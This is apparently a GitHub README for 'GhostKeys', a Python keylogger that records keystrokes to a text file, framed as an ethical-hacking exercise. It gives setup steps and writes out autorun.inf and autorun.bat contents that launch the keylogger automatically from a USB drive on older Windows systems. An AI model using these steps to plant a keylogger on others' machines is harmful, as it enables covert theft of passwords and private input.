# GhostKeys

GhostKeys is a simple **keylogger** project built using Python. It captures keystrokes on the system and stores them in a text file. The project demonstrates event-driven programming with the `pynput` library and serves as a learning exercise in ethical hacking and cybersecurity.

**Note**: This tool is for educational purposes only. Please use it responsibly and always get explicit consent from the owner of the system you are testing.

---

## Features
- Captures keystrokes in real-time
- Stores keystrokes in a text file (`keyfile.txt`)
- Runs in the background using the `pynput` library
- Can be converted into a standalone executable using PyInstaller
- Includes autorun functionality for USB drives (for older systems)

---

## Installation

### Prerequisites
- **Python**: You need Python installed on your system. If you don't have it, you can download it from [python.org](https://www.python.org/).
- **Pip**: Ensure that you have `pip` to install Python libraries.

### Steps to Set Up the Project

1. **Clone the Repository**:
   To clone this repository, run the following command:
   ```bash
   git clone https://github.com/yourusername/ghostkeys.git
   ```

2. **Install Dependencies**:
   In your terminal, navigate to the cloned repository directory and run:
   ```bash
   pip install pynput
   ```

3. **Run the Script**:
   To start logging keystrokes, run the following command:
   ```bash
   python ghostkeys.py
   ```

4. **Stopping the Script**:
   Press **Esc** on your keyboard to stop the script and exit the listener.

---

## Standalone Executable

If you want to run **GhostKeys** on a system without Python installed, you can use the precompiled executable available in the `dist` folder.

### How to Use the Executable:
1. **Download the Repository**:  
   Clone or download this repository to your system.
   
2. **Navigate to the `dist` Folder**:  
   Inside the repository, you will find a `dist` folder. This folder contains the standalone executable (`ghostkeys.exe`), along with necessary files for running it automatically.

3. **Run the Executable**:  
   - **Windows**: Double-click on `ghostkeys.exe` to run the program. It will start logging keystrokes and storing them in the `keyfile.txt` file.

4. **Stopping the Script**:  
   Press **Esc** on your keyboard to stop the script.

---

## USB Flashing (Autorun for Older Systems)

If you want to run **GhostKeys** automatically when a USB drive is inserted into a system (especially for older systems), you can use the **autorun functionality**.

### Steps to Flash the Script onto a USB Drive:

1. **Copy Files to the USB**:
   - Copy the following files from the `dist` folder to your USB drive:
     - `ghostkeys.exe` (the executable file)
     - `autorun.bat` (the batch file to launch the executable)
     - `autorun.inf` (the configuration file to trigger autorun)

2. **Set Up Autorun**:
   - The `autorun.inf` file contains the instructions to automatically run the `autorun.bat` file when the USB is inserted into a system.
   
   Here’s the content of `autorun.inf`:
   ```ini
   [autorun]
   open=autorun.bat
   action=Run Keylogger
   icon=keylogger.ico
   ```
   - The `autorun.bat` file ensures that **ghostkeys.exe** is launched when the USB is inserted.
   
   Here’s the content of `autorun.bat`:
   ```batch
   @echo off
   start ghostkeys.exe
   ```

3. **Insert the USB Drive**:
   - Once you've copied the files, safely eject and reinsert the USB into the system where you want to run the keylogger.
   - On **older Windows systems** (pre-Windows 7 or systems with autorun still enabled), the program should automatically run when the USB is inserted. For newer systems, **manual execution** is needed.

### **Important Note**:  
- **Modern Security**: On modern operating systems (Windows 7 and later), **autorun** is disabled for security reasons, so the automatic execution of the program may not work.
- **Ethical Use**: This tool should only be used on systems where you have explicit permission. Unauthorized use of keyloggers is illegal and unethical.

---

## Ethical Use

- This tool should only be used on systems where you have explicit permission. Unauthorized use of keyloggers is illegal and unethical.
- Always ensure you are testing on a controlled environment or with the consent of the target system's owner.

---

## License

The code for **GhostKeys** is licensed under the [MIT License](https://opensource.org/licenses/MIT). You can freely use, modify, and distribute it under the following conditions:

- **Permission is granted** to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software.
- **No warranty**: The software is provided "as is", without warranty of any kind, either express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, or noninfringement.

For more details, refer to the [LICENSE file](LICENSE).

---


